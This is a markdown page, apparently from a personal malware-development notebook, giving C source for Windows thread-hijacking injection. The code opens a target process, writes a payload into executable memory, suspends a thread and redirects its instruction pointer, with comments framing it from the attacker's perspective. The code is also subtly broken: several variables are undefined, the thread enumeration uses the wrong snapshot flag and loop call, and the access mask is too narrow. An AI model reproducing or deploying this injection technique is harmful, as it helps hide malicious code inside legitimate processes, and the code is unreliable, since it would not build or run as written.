# Inject Spawned Thread

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

/*
https://cocomelonc.github.io/tutorial/2021/11/23/malware-injection-6.html
https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32next
https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread
https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext
https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext
https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread

$ x86_64-w64-mingw32-gcc get-process-id.c -o payload.exe -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive >/dev/null 2>&1
*/

// Find proccess ID by process name
DWORD getProcessID(const char *process_name) {
    HANDLE handle_snapshot;
    PROCESSENTRY32 process_entry;
    DWORD process_id = 0;
    BOOL handle_result;

    // snapshot of all processes in the system
    handle_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if(INVALID_HANDLE_VALUE == handle_snapshot)
        return 0;

    // initializing size: needed for using Process32First
    process_entry.dwSize = sizeof(PROCESSENTRY32);

    // info about first process encountered in a system snapshot
    handle_result = Process32First(handle_snapshot, &process_entry);

    // retrieve information about the processes
    // and exit if unsuccessful
    while(handle_result) {
        // if we find the process: return process ID
        if(strcmp(process_name, process_entry.szExeFile) == 0) {
            process_id = process_entry.th32ProcessID;
            break;
        }
        handle_result = Process32Next(handle_snapshot, &process_entry);
    }

    // closes an open handle (CreateToolhelp32Snapshot)
    CloseHandle(handle_snapshot);
    return process_id;
}

int main(int argc, char *argv[]) {
    DWORD process_id = 0; // process ID
    HANDLE process_handle; // process handle
    HANDLE handle_thread; // thread_handle
    LPVOID remote_buffer; // remote buffer

    HANDLE handle_snapshot;
    THREADENTRY32 thread_entry;
    CONTEXT context;

    // parse process ID
    process_id = getProcessID(argv[1]);
    if(process_id == 0) {
        printf("PID not found! Terminating...\n");
        return -1;
    } else {
        printf("PID: %d\n", process_id);

        context.ContextFlags = CONTEXT_FULL;
        thread_entry.dwSize = sizeof(THREADENTRY32);
        // process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)process_id);

        // 0x00000028 for needed permissions so it doesn't have to be all of it

        // From the attacker's perspective
        // C:\> payload.exe notepad.exe
        process_handle = OpenProcess(0x00000028, FALSE, (DWORD)process_id);

        if(process_handle == NULL) {
            printf("OpenProcess failed! Exiting...\n");
            return -2;
        }

        // Allocate memory buffer for remote process
        remote_buffer = VirtualAllocEx(process_handle, NULL, size,
                        (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

        // Write payload to memory buffer
        WriteProcessMemory(process_handle, remote_buffer, payload, size, NULL);

        // Find thread ID for hijacking
        handle_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
        if(Thread32First(handle_snapshot, &thread_entry)) {
            do {
                if(pid == thread_entry.th32OwnerProcessID) {
                    handle_thread = OpenThread(THREAD_ALL_ACCESS, FALSE, thread_entry.th32ThreadID);
                    break;
                }
            } while(Thread32First(handle_snapshot, &thread_handle));
        }

        // Suspend target thread
        SuspendThread(handle_thread);
        GetThreadContext(handle_thread, &context);

        // Update register (RIP)
        context.Rip = (DWORD_PTR)remote_buffer;
        SetThreadContext(handle_thread, &context);
        ResumeThread(handle_thread);

        CloseHandle(process_handle);
    }
    return 0;
}
```

---
## References

### Tenouk

- [Tenouk: Processes and Threads - WinAPIs - Part 10](https://www.tenouk.com/ModuleU4.html)